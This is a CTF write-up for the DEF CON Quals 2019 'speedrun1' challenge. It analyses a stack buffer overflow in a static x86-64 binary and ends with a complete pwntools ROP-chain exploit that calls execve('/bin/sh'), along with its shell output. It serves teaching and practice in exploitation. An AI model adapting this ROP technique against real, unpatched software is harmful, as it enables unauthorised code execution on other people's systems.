# Defcon Quals 2019 Speedrun1

## Challenge Overview

Let's take a look at the binary:

```bash
$ file speedrun-001
speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped

$ pwn checksec speedrun-001
[*] '/Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ ./speedrun-001
Hello brave new challenger
Any last words?
15935728
This will be the last thing that you say: 15935728

Alas, you had no luck today.
```

We're dealing with a **64-bit statically compiled binary**. This binary has **NX (Non-Executable stack)** enabled, which means that the stack memory region is not executable.

### Memory Layout

```
gefâž¤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
0x00007ffff7ffa000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

The stack memory region begins at `0x00007ffffffde000` and ends at `0x00007ffffffff000` with `rw-` permissions. Since the binary is statically compiled, libc portions are compiled into the binary itself (not linked from an external library).

## Binary Analysis

### Finding the Vulnerable Function

When examining the binary in Ghidra, we discover the following main function structure:

```c
undefined8
main(undefined8 uParm1, undefined8 uParm2, undefined8 uParm3, undefined8 uParm4, undefined8 uParm5,
    undefined8 uParm6)
{
  long lVar1;
 
  FUN_00410590(PTR_DAT_006b97a0, 0, 2, 0, uParm5, uParm6, uParm2);
  lVar1 = FUN_0040e790("DEBUG");
  if (lVar1 == 0) {
    FUN_00449040(5);
  }
  FUN_00400b4d();
  FUN_00400b60();
  FUN_00400bae();
  return 0;
}
```

The `FUN_00400b60` function is of particular interest. Here's the vulnerable code:

```c
void interesting(void)
{
  undefined input[1024];
 
  FUN_00410390("Any last words?");
  FUN_004498a0(0, input, 2000);
  FUN_0040f710("This will be the last thing that you say: %s\n", input);
  return;
}
```

**The vulnerability**: The function allocates only **1024 bytes** for `input`, but reads **2000 bytes** into it. This is a classic **buffer overflow**.

### Input Handling via Syscall

Looking at the input function (`FUN_004498a0`):

```c
undefined8 FUN_004498a0(undefined8 uParm1, undefined8 uParm2, undefined8 uParm3)
{
  uint uVar1;
 
  if (DAT_006bc80c == 0) {
    syscall();
    return 0;
  }
  uVar1 = FUN_0044be40();
  syscall();
  FUN_0044bea0((ulong)uVar1, uParm2, uParm3);
  return 0;
}
```

The binary uses **syscalls** to read input (not standard library functions like `scanf` or `fgets`):

```asm
004498aa 31 c0           XOR        EAX,EAX
004498ac 0f 05           SYSCALL
```

### Calculating the Offset

Using GDB to find where we can overwrite the return address:

```
gefâž¤  b *0x400b90
Breakpoint 1 at 0x400b90
gefâž¤  r
Starting program: /Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001
Hello brave new challenger
Any last words?
15935728

gefâž¤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffda30 - 0x7fffffffda38  â†’   "15935728"

gefâž¤  i f
Stack level 0, frame at 0x7fffffffde40:
 rip = 0x400b90; saved rip = 0x400c1d
 called by frame at 0x7fffffffde60
 Arglist at 0x7fffffffda28, args:
 Locals at 0x7fffffffda28, Previous frame's sp is 0x7fffffffde40
 Saved registers:
  rbp at 0x7fffffffde30, rip at 0x7fffffffde38
```

**Offset calculation**: `0x7fffffffde38 - 0x7fffffffda30 = 0x408` bytes

## Exploitation Strategy

We'll craft a **ROP Chain (Return Oriented Programming)** using gadgets from the binary itself to execute a `sys_execve` syscall for `/bin/sh`.

### Syscall Requirements

For `sys_execve` to execute `/bin/sh`:

| Register | Value | Purpose |
|----------|-------|---------|
| `rax` | 59 (0x3b) | Specify `sys_execve` |
| `rdi` | ptr to "/bin/sh" | File to execute |
| `rsi` | 0 | No arguments passed |
| `rdx` | 0 | No environment variables |

### Finding ROP Gadgets

Using ROPgadget to locate gadgets:

```bash
$ python ROPgadget.py --binary speedrun-001 | grep "pop rax ; ret"
0x0000000000415664 : pop rax ; ret

$ python ROPgadget.py --binary speedrun-001 | grep "pop rdi ; ret"
0x0000000000400686 : pop rdi ; ret

$ python ROPgadget.py --binary speedrun-001 | grep "pop rsi ; ret"
0x00000000004101f3 : pop rsi ; ret

$ python ROPgadget.py --binary speedrun-001 | grep "pop rdx ; ret"
0x00000000004498b5 : pop rdx ; ret
```

**Selected gadgets:**
- `0x415664`: `pop rax ; ret`
- `0x400686`: `pop rdi ; ret`
- `0x4101f3`: `pop rsi ; ret`
- `0x4498b5`: `pop rdx ; ret`

For writing data to memory, we found the perfect gadget:

```bash
$ python ROPgadget.py --binary speedrun-001 | grep "mov.*\[rax\].*rdx"
0x000000000048d251 : mov qword ptr [rax], rdx ; ret
```

And the syscall gadget:

```bash
$ python ROPgadget.py --binary speedrun-001 | grep ": syscall"
0x000000000040129c : syscall
```

### Memory Location for "/bin/sh"

From the memory map, the writable region `0x6b6000 - 0x6bc000` is ideal for storing our string:

```
gefâž¤  x/10g 0x6b6000
0x6b6000:    0x0    0x0
0x6b6010:    0x0    0x0
0x6b6020:    0x0    0x0
0x6b6030:    0x0    0x0
0x6b6040:    0x0    0x0
```

We'll use `0x6b6000` to store "/bin/sh".

## Exploit Implementation

```python
from pwn import *

target = process('./speedrun-001')

# ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# Write gadget: mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Syscall gadget
syscall = p64(0x40129c)

# Build ROP chain
rop = ''

# Part 1: Write "/bin/sh" to 0x6b6000
# pop rdx, 0x2f62696e2f736800
# pop rax, 0x6b6000
# mov qword ptr [rax], rdx
rop += popRdx
rop += "/bin/sh\x00"
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

# Part 2: Set up syscall arguments
# pop rax, 0x3b (sys_execve)
rop += popRax
rop += p64(0x3b)

# pop rdi, 0x6b6000 (ptr to "/bin/sh")
rop += popRdi
rop += p64(0x6b6000)

# pop rsi, 0 (no arguments)
rop += popRsi
rop += p64(0)

# pop rdx, 0 (no environment variables)
rop += popRdx
rop += p64(0)

# Part 3: Make the syscall
rop += syscall

# Build payload: padding + ROP chain
payload = "0" * 0x408 + rop

# Send payload and interact with the shell
target.sendline(payload)
target.interactive()
```

## Results

```bash
$ python exploit.py
[+] Starting local process './speedrun-001': pid 12189
[*] Switching to interactive mode
Hello brave new challenger
Any last words?
This will be the last thing that you say: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000[...]
$ w
 03:19:37 up 13:12,  1 user,  load average: 0.51, 0.97, 0.88
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               Wed14   ?xdm?  14:26   0.01s /usr/lib/gdm3/gdm-x-session --session=ubuntu
$ ls
exploit.py  readme.md  speedrun-001
```

**Success!** We've popped a shell using ROP gadget chain exploitation. ðŸŽ‰